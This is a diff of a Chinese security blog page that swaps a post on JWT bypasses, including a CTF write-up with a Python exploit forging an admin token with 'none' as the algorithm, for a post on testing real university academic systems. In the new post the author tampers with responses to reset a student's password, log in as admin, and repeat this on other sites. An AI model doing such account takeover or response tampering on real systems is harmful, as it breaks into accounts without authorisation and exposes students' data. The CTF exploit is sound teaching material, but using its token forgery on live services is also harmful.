@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="jwt的绕过方式, 船到桥头自然直">
+    <meta name="keywords" content="记一次逻辑漏洞挖掘, 船到桥头自然直">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>jwt的绕过方式 | 船到桥头自然直</title>
+    <title>记一次逻辑漏洞挖掘 | 船到桥头自然直</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">jwt的绕过方式</h1>
+                    <h1 class="description center-align post-title">记一次逻辑漏洞挖掘</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-10-04
+                    2021-11-10
                 </div>
                 
 
@@ -459,228 +459,28 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="0x01什么是JWT"><a href="#0x01什么是JWT" class="headerlink" title="0x01什么是JWT"></a>0x01什么是JWT</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">以下内容摘自此文章</a></p>
-<ul>
-<li>JSON Web Token的结构</li>
-</ul>
-<p><img src="https://images2018.cnblogs.com/blog/874963/201807/874963-20180709124807031-664967381.png" alt="img"></p>
-<p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p>
-<ul>
-<li>Header</li>
-<li>Payload</li>
-<li>Signature</li>
-</ul>
-<p>因此，一个典型的JWT看起来是这个样子的：</p>
-<p>xxxxx.yyyyy.zzzzz</p>
-<ul>
-<li>Header</li>
-</ul>
-<p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。</p>
-<p>例如：</p>
-<p><img src="https://images2018.cnblogs.com/blog/874963/201807/874963-20180707143936465-1142974441.png" alt="img"></p>
-<p>然后，用Base64对这个JSON编码就得到JWT的第一部分</p>
-<ul>
-<li>Payload</li>
-</ul>
-<p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p>
-<ul>
-<li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</li>
-<li>Public claims : 可以随意定义。</li>
-<li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</li>
-</ul>
-<p>下面是一个例子：</p>
-<p><img src="https://images2018.cnblogs.com/blog/874963/201807/874963-20180707144153274-292205768.png" alt="img"></p>
-<p>对payload进行Base64编码就得到JWT的第二部分</p>
-<p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p>
-<ul>
-<li>Signature</li>
-</ul>
-<p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。</p>
-<p>例如：</p>
-<p>HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p>
-<p>签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。</p>
-<ul>
-<li>JWT解密网站</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
-<p>看一张官网的图</p>
-<p><img src="https://images2018.cnblogs.com/blog/874963/201807/874963-20180707150229764-2037235703.png" alt="img"></p>
-<ul>
-<li> JSON Web Tokens是如何工作的</li>
-</ul>
-<p>在认证的时候，当用户用他们的凭证成功登录以后，一个JSON Web Token将会被返回。此后，token就是用户凭证了，你必须非常小心以防止出现安全问题。一般而言，你保存令牌的时候不应该超过你所需要它的时间。</p>
-<h5 id="0x02如何绕过JWT验证"><a href="#0x02如何绕过JWT验证" class="headerlink" title="0x02如何绕过JWT验证"></a>0x02如何绕过JWT验证</h5><ul>
-<li><p>当然如果网站泄露了加密的密钥+获取到一个密文。就可以利用jwt.io网站进行任意身份是伪造</p>
-</li>
-<li><p>利用c-jwt-cracker工具进行密钥的爆破</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">工具地址</a></p>
-</li>
-<li><p>修改算法从RS256到HS256</p>
-</li>
-<li><p>利用网站的缺陷（将加密算法改成None）。例：nodejs的jwt缺陷，当jwt的secret为空，jwt会采用algorithm为none进行解密。</p>
-</li>
-</ul>
-<p>题目：[HFCTF2020]EasyLogin</p>
-<p>题目功能很简单</p>
-<ul>
-<li>注册</li>
-<li>登录</li>
-<li>GETFLAG</li>
-</ul>
-<p>首先注册个普通用户，登录进去。点击GETFLAG。提示无权限，猜测需要admin才能获取。</p>
-<p>查看网站加载的js文件，发现app.js</p>
-<pre><code>/**
- *  或许该用 koa-static 来处理静态文件
- *  路径该怎么配置？不管了先填个根目录XD
- */
-
- function login() &#123;
-    const username = $(&quot;#username&quot;).val();
-    const password = $(&quot;#password&quot;).val();
-    const token = sessionStorage.getItem(&quot;token&quot;);
-    $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;)
-        .done(function(data) &#123;
-            const &#123;status&#125; = data;
-            if(status) &#123;
-                document.location = &quot;/home&quot;;
-            &#125;
-        &#125;)
-        .fail(function(xhr, textStatus, errorThrown) &#123;
-            alert(xhr.responseJSON.message);
-        &#125;);
-&#125;
-
-function register() &#123;
-    const username = $(&quot;#username&quot;).val();
-    const password = $(&quot;#password&quot;).val();
-    $.post(&quot;/api/register&quot;, &#123;username, password&#125;)
-        .done(function(data) &#123;
-            const &#123; token &#125; = data;
-            sessionStorage.setItem(&#39;token&#39;, token);
-            document.location = &quot;/login&quot;;
-        &#125;)
-        .fail(function(xhr, textStatus, errorThrown) &#123;
-            alert(xhr.responseJSON.message);
-        &#125;);
-&#125;
-
-function logout() &#123;
-    $.get(&#39;/api/logout&#39;).done(function(data) &#123;
-        const &#123;status&#125; = data;
-        if(status) &#123;
-            document.location = &#39;/login&#39;;
-        &#125;
-    &#125;);
-&#125;
-
-function getflag() &#123;
-    $.get(&#39;/api/flag&#39;).done(function(data) &#123;
-        const &#123;flag&#125; = data;
-        $(&quot;#username&quot;).val(flag);
-    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;
-        alert(xhr.responseJSON.message);
-    &#125;);
-&#125;</code></pre>
-<p>这里就要看自己的经验了，发现是koa框架</p>
-<p>框架的目录结构</p>
-<p><a target="_blank" rel="noopener" href="https://images.cnblogs.com/cnblogs_com/LEOGG321/1821760/o_20080512041814.png"><img src="https://images.cnblogs.com/cnblogs_com/LEOGG321/1821760/o_20080512041814.png" alt="img"></a></p>
-<p>访问/controllers/api.js得到主要逻辑代码</p>
-<pre><code>const crypto = require(&#39;crypto&#39;);
-const fs = require(&#39;fs&#39;)
-const jwt = require(&#39;jsonwebtoken&#39;)
-
-const APIError = require(&#39;../rest&#39;).APIError;
-
-module.exports = &#123;
-    &#39;POST /api/register&#39;: async (ctx, next) =&gt; &#123;
-        const &#123;username, password&#125; = ctx.request.body;
-
-        if(!username || username === &#39;admin&#39;)&#123;
-            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
-        &#125;
-
-        if(global.secrets.length &gt; 100000) &#123;
-            global.secrets = [];
-        &#125;
-
-        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
-        const secretid = global.secrets.length;
-        global.secrets.push(secret)
-
-        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);
-
-        ctx.rest(&#123;
-            token: token
-        &#125;);
-
-        await next();
-    &#125;,
-
-    &#39;POST /api/login&#39;: async (ctx, next) =&gt; &#123;
-        const &#123;username, password&#125; = ctx.request.body;
-
-        if(!username || !password) &#123;
-            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
-        &#125;
-
-        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;
-
-        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;
-
-        console.log(sid)
-
-        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;
-            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
-        &#125;
-
-        const secret = global.secrets[sid];
-
-        const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);
-
-        const status = username === user.username &amp;&amp; password === user.password;
-
-        if(status) &#123;
-            ctx.session.username = username;
-        &#125;
-
-        ctx.rest(&#123;
-            status
-        &#125;);
-
-        await next();
-    &#125;,
-
-    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; &#123;
-        if(ctx.session.username !== &#39;admin&#39;)&#123;
-            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
-        &#125;
-
-        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
-        ctx.rest(&#123;
-            flag
-        &#125;);
-
-        await next();
-    &#125;,
-
-    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; &#123;
-        ctx.session.username = null;
-        ctx.rest(&#123;
-            status: true
-        &#125;)
-        await next();
-    &#125;
-&#125;;</code></pre>
-<p>可以看到注册名不能是admin，然后如果登录为admin就可以获取到flag。</p>
-<ul>
-<li>利用</li>
-</ul>
-<p>js是弱语言类型，我们可以将secretid设置为一个小数或空数组（空数组与数字比较时为0）来绕过secretid的一个验证（不能为null&amp;undefined）</p>
-<p>exp</p>
-<pre><code>import jwt
-token = jwt.encode(&#123;&quot;secretid&quot;:[],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1596626836&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;)
-print(token)
-#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU5NjYyNjgzNn0.</code></pre>
+                <p>一般来说学校的教务系统都是集群站点，前台没有啥漏洞（大佬除外)。大部分只能靠github，google等地方获取学号等信息，进行爆破登录。这个时候，再逛某个大学的教务系统发现底下的技术支持好像见过，但是版本号好像低了点。猜想说不定有漏洞。</p>
+<p>开始了测试之旅</p>
+<p>先用github，googld搜集一波信息</p>
+<p><img src="D:\boke\blog\source\images\149.png"></p>
+<p>可以跟换语法，搜集一下学号规律，默认密码啥的。因为总有人没改默认密码。</p>
+<p>先是看注册功能，可以注册成功，但需要管理员激活才可以登录。没啥用。</p>
+<p>还有一个忘记密码功能，尝试任意密码修改。</p>
+<p><img src="D:\boke\blog\source\images\150.png"></p>
+<p>很常见的一个修改密码登录框，填完用户名，手机号随便填，验证码也随便填。拦截返回包</p>
+<p><img src="D:\boke\blog\source\images\151.png"></p>
+<p>直接把false改成true即可绕过验证。进入密码重置阶段，但是发现它是基于手机号识别用户的，如果填入的手机号是存在的，在下一步会自动出现对应匹配的用户名。如果没有就会是空的。不过不要紧，这都是基于前端的显示，填好密码。发送数据包，把用户名改成我们之前填入那个。发包，重置成功。</p>
+<p>当然了，必须要登录验证一下是否真的成功，因为有些只是前端显示重置成功，而后端数据库并没有修改。经过验证，成功登录该学号的教务系统。</p>
+<p>接下来就是必测的功能点，登录框了。</p>
+<p>先用刚才重置过的账号密码，正常登录一遍，观察一遍请求包和响应包。</p>
+<p>发现响应包回来竟然没带cookie，而且有响应状态码和对应的用户名，猜测也是用前端验证。</p>
+<p><img src="D:\boke\blog\source\images\152.png"></p>
+<p>对着返回的状态码去翻一遍所有的js代码文件，发现在user.js文件里出现的该响应包，对应的信息都可以对上。接下来就看返回多少状态码是登录成功的了。成功发现，测试一下。</p>
+<p>拦截数据包修改code发包，发现登录成功。</p>
+<p>尝试登录admin账号，成功登录。</p>
+<p><img src="D:\boke\blog\source\images\153.png"></p>
+<p>刚才提到系统底下有技术支持，所以有fofa对着搜了一下，发现有十几家。测了另外一个站，也成功了。</p>
+<p>渗透测试点到为止，后面就没继续测了。该漏洞已经上报。</p>
 
             </div>
             <hr/>
@@ -706,7 +506,7 @@ print(token)
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/10/04/jwt%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/">http://example.com/2021/10/04/jwt%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/</a>
+                    <a href="http://example.com/2021/11/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">http://example.com/2021/11/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -911,9 +711,10 @@ print(token)
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/11/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
                     <div class="card-image">
@@ -931,9 +732,9 @@ print(token)
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -942,6 +743,7 @@ print(token)
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -952,13 +754,13 @@ print(token)
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/15/struts2%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/">
+                <a href="/2021/10/04/jwt%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="struts2系列复现">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="jwt的绕过方式">
                         
-                        <span class="card-title">struts2系列复现</span>
+                        <span class="card-title">jwt的绕过方式</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -969,7 +771,7 @@ print(token)
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-15
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-04
                             </span>
                         <span class="publish-author">
                             
